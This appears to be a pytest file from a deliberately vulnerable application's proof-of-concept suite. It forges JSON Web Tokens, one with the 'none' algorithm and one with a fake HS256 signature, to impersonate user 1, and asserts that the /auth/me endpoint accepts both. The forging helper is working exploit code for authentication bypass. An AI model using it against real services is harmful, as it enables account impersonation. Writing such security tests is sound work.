"""
JWT Vulnerability PoC Tests (Vulnerabilities #11-#12)

Tests that the backend accepts tokens with the "none" algorithm and
tokens with invalid signatures.
"""
import base64
import json

import requests


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _forge_jwt(payload: dict, alg: str = "none", signature: str = "") -> str:
    header = {"alg": alg, "typ": "JWT"}
    h = _b64url(json.dumps(header).encode())
    p = _b64url(json.dumps(payload).encode())
    return f"{h}.{p}.{signature}"


class TestJWTNoneAlgorithm:
    """#11 - JWT 'none' algorithm accepted (Broken Authentication)"""

    def test_vuln_11_jwt_none(self, base_url):
        """A forged JWT with alg=none and no signature is accepted by /auth/me."""
        token = _forge_jwt({
            "user_id": 1,
            "email": "joe@example.com",
            "exp": 9999999999,
        })
        r = requests.get(f"{base_url}/auth/me",
                         headers={"Authorization": f"Bearer {token}"})
        data = r.json()
        assert data["success"] is True, f"JWT none algorithm was rejected: {data}"
        assert data["user"]["email"] == "joe@example.com"


class TestJWTSignatureBypass:
    """#12 - JWT signature not verified (Broken Authentication)"""

    def test_vuln_12_jwt_bad_signature(self, base_url):
        """A JWT with a completely wrong signature is still accepted."""
        token = _forge_jwt(
            payload={
                "user_id": 1,
                "email": "joe@example.com",
                "exp": 9999999999,
            },
            alg="HS256",
            signature="dGhpcyBpcyBhIGZha2Ugc2lnbmF0dXJl",  # "this is a fake signature"
        )
        r = requests.get(f"{base_url}/auth/me",
                         headers={"Authorization": f"Bearer {token}"})
        data = r.json()
        assert data["success"] is True, f"JWT with bad signature was rejected: {data}"
        assert data["user"]["email"] == "joe@example.com"
